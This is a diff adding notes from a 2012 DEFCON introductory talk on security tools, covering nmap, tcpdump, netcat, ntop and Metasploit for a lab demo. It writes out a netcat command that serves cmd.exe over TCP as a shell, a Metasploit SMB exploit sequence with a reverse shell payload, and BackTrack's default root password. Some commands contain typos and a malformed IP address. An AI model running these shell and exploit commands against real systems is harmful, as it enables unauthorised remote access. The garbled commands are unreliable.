@@ -1,0 +1,76 @@
+Intro to Digital Forensics: Tools & Tactics
+Ripshy & Jacob
+07/26/2012 1100 - Track 1 (DEFCON101 Sessions)
+
+BackTrack 5.
+  * root / toor
+  * Network not started by default
+  * SSHD not started by default
+
+Top 5 Tools
+  * Nmap
+  * Tcpdump - libpcap
+  * nc
+  * Ntop
+  * Metasploit
+
+Nmap
+  * Scans networks for open ports, alive hosts, OS fingerprinting, etc
+    - today = scanning + os fingerprinting
+  * How to use:
+
+    nmap -v -sT -F -A -oG output.grep 10.x.x.x/24
+
+    -v = increase verbosity of output
+    -sT = do a full TCP connection to all ports (NOTE: This is not stealthy!)
+    -F = fast scan, only scan ports in /etc/services
+    -A = enable os fingerprinting + other features (NOTE: this is also -O, but -A is more full featured)
+    -oG = output to greppable format
+    
+Tcpdump
+  * Dumps all traffic seen on a network interface to screen or file
+    - today = capture basic packets and do simple analysis
+  * How to use:
+
+    tcpdump -i eth0 -n -x
+
+    -i = interface we want to listen to
+    -n = turn off /etc/services translation and turn off dns lookup
+    -x = dump hex of output to screen
+
+    (Side note: 0x45 = IPv4. 4*5 = 20 bytes in IP header.  Similar for 0x6_)
+
+Netcat:
+  * Creates TCP compliant sockets
+    - today = we will create a reverse shell for today's demo
+  * How to use:
+
+   C:\> nc -l -p 2000 -e cmd.exe
+   localhost# nc 172.16.75.1.30 2000
+
+   -l = listen on a port
+   -p = port should be X
+   -e = when connection is established, execute a command
+
+   This is effectively running Window's cmd.exe across a TCP socket.
+
+Ntop:
+  * Slurps up network traffic (like tcpdump) and poops out perdy webpages detailing network traffic information
+    - today = screenshots only
+
+  Outputs a webpage similar to what top looks like inspecting network traffic.
+  It does have a curses interface.
+
+Metasploit:
+  * Turns common vunerabilities into a point-and-click p0wnage fest
+    - today = Windows XP SP2 is lulz
+  * How to use:
+    localhost# msfconsole
+    msf> use windows/smb/????_067_netapi
+    msf> set rhost 172.16.75.130
+    msf> set target 0
+    msf> set payload windows/sheel_reverse_tcp
+    msf> set lhost 172.16.75.129
+    msf> exploit
+
+
